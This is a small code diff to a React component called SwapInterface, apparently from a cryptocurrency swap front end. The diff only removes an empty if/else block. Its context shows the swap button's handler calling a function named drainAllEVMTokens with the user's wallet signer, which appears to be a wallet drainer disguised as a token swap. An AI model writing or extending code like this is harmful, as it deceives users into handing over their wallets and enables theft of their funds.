@@ -392,9 +392,6 @@ export const SwapInterface = ({
         setIsSwapping(true);
         const chainName = getEVMChain()?.name || 'EVM';
         await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
-        if (hash) {
-        } else {
-        }
       } catch (error: any) {
         console.error('EVM swap error:', error);
       } finally {
